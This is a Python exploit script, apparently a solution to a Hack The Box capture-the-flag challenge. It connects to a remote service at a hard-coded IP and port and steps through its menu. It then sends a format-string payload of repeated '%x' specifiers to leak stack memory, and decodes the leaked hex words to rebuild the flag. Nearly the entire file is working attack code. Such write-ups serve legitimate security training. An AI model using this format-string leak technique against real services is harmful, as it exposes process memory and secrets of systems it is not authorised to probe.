import socket

s = socket.socket()

s.connect(('64.227.39.88',32697))

print("exploit.py: Sending name")
s.recv(4096)
s.recv(4096)
s.send("ropgadgetzz".encode()) #Name, last character gets deleted for some reason
s.recv(4096)
print("exploit.py: Sending nickname")
s.send("ropgadgetzz".encode()) #Nickname, last character gets deleted for some reason
s.recv(4096)
s.send("2".encode()) #2 = 
s.recv(4096)
s.send("1".encode())
s.recv(4096)
s.send("2".encode())
s.recv(4096) #print(s.recv(4096).decode())
s.recv(4096)#print(s.recv(4096).decode())
exploit="%x "*100
print("exploit.py: Sending exploit")
s.send(exploit.encode())
addresses = s.recv(4096).decode().split("this:")[1].split()
#print(addresses)

def str2dict(dict):
    string=""
    for item in dict:
        string+=item
    return string
STRING=[]
for address in addresses:
    #print(address)
    try:
        if address == "\x1b[0m":
            pass
        else:
            yes=bytes.fromhex(address).decode(errors="ignore")
            STRING.append(yes)
    except:
        pass
REVERSE_STRING=STRING[::-1]

messed_flag=str2dict(REVERSE_STRING)
messed_flag=messed_flag.split("_")
#print(messed_flag)
messed_flag=messed_flag[0:16]
htb_why=messed_flag[-1][0:7][::-1]
did=messed_flag[7][::-1]
i=messed_flag[6]
save=messed_flag[5]
the=messed_flag[4]
flag=messed_flag[3]
on=messed_flag[2]
the=messed_flag[1]
stack=messed_flag[0][-7:][::-1] #last 7 characters of the first element
the_flag=htb_why+"_"+did+"_"+i+"_"+save+"_"+the+"_"+flag+"_"+on+"_"+the+"_"+stack+"}"
print("exploit.py: Fixing the flag")
the_flag=the_flag.replace("3v4s","s4v3")
the_flag=the_flag.replace("3ht","th3")
the_flag=the_flag.replace("g4lf","fl4g")
the_flag=the_flag.replace("n0","0n")
the_flag=the_flag.replace("!?kc4t5","5t4ck?!")
print("exploit.py: "+the_flag)
